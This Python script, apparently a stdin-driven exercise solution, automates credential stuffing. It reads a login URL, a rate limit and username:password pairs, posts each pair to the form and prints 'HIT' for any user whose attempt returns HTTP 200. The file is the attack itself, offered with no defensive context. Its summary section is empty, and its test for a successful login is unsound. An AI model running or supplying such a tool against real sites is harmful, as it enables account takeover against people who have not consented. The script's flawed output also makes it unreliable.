import sys
import urllib.request
import urllib.parse
import time

def main():
    # Read login URL
    login_url = input().strip()
    
    # Read rate (requests per second)
    rate = float(input().strip())
    
    # Calculate delay between requests
    delay = 1.0 / rate if rate > 0 else 0
    
    # Read credential pairs
    credentials = []
    while True:
        try:
            line = input().strip()
            if not line:
                break
            if ':' in line:
                user, password = line.split(':', 1)
                credentials.append((user, password))
        except EOFError:
            break
    
    successful_logins = []
    total_attempts = 0
    
    # Test each credential pair
    for user, password in credentials:
        total_attempts += 1
        
        try:
            # Prepare POST data
            data = urllib.parse.urlencode({
                'username': user,
                'password': password
            }).encode('utf-8')
            
            # Create request
            req = urllib.request.Request(login_url, data=data)
            req.add_header('Content-Type', 'application/x-www-form-urlencoded')
            
            # Send request
            response = urllib.request.urlopen(req)
            status_code = response.getcode()
            
            # Check if login was successful (status 200)
            if status_code == 200:
                print(f'HIT: {user}')
                successful_logins.append(user)
        
        except Exception:
            pass
        
        # Rate limiting delay
        if delay > 0:
            time.sleep(delay)
    
    # Print summary
    print('Summary:')

if __name__ == '__main__':
    main()